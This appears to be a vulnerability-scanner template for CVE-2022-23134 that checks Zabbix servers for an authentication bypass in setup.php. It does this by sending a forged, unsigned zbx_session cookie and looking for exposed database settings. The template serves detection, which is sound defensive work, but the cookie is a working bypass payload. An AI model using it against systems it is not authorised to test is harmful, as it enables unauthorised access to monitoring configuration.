id: CVE-2022-23134

info:
  name: Zabbix Setup Configuration Authentication Bypass
  author: bananabr
  severity: medium
  description: After the initial setup process, some steps of setup.php file are reachable not only by super-administrators but also by unauthenticated users. A malicious actor can pass step checks and potentially change the configuration of Zabbix Frontend.
  reference:
    - https://blog.sonarsource.com/zabbix-case-study-of-unsafe-session-storage
    - https://nvd.nist.gov/vuln/detail/CVE-2022-23134

rules:
    r0:
        request:
            method: GET
            path: /zabbix/setup.php
            headers:
              Cookie: "zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D"
        expression: |
            response.status == 200 && response.body.bcontains(b'Database') && response.body.bcontains(b'host') && response.body.bcontains(b'port') && response.body.bcontains(b'Zabbix')
    r1:
        request:
            method: GET
            path: /setup.php
            headers:
              Cookie: "zbx_session=eyJzZXNzaW9uaWQiOiJJTlZBTElEIiwiY2hlY2tfZmllbGRzX3Jlc3VsdCI6dHJ1ZSwic3RlcCI6Niwic2VydmVyQ2hlY2tSZXN1bHQiOnRydWUsInNlcnZlckNoZWNrVGltZSI6MTY0NTEyMzcwNCwic2lnbiI6IklOVkFMSUQifQ%3D%3D"
        expression: |
            response.status == 200 && response.body.bcontains(b'Database') && response.body.bcontains(b'host') && response.body.bcontains(b'port') && response.body.bcontains(b'Zabbix')
expression: r0() || r1()